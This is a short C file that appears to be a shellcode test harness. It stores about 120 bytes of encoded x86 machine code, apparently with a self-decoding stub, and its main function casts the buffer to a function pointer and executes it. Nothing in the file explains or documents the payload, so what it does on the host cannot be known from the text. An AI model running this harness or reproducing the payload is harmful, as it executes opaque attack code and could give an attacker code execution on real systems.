#include<stdio.h>
#include<string.h>

unsigned char code[] =  "\xb8\xed\xcb\x84\x44\xda\xdd\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x17\x31\x42\x15\x83\xc2\x04\x03\x42\x11\xe2\x18\xfa\x4d\xcd\x29\x97\x0b\x96\x60\xe8\xfe\x23\x22\xd8\x37\x7a\xba\x69\xbb\x0a\x5e\xe6\x14\xda\xee\x97\x02\x0b\x6b\x2c\xb0\xda\x90\x8d\x83\xd9\x9b\x8e\x7f\x09\x01\x8f\x7f\xca\x3c\xec\x0c\xa9\x84\xb3\x88\x68\x9d\x0a\x08\x3b\x29\x5d\xa4\xc2\xb3\xf6\x72\x05\x09\x39\xb9\x5f\x42\x03\x92\xfd\xf5\x1d\xc3\x72\x6d\xe8\x42\xfe\x3c\x10\x1e\x04\xe6\x25\x5f\x6e\x17\xee\xad\xef";



main()
{
	printf("Shellcode Length: %d\n",strlen(code));
	int (*ret) () = (int(*)())code;
	ret();
}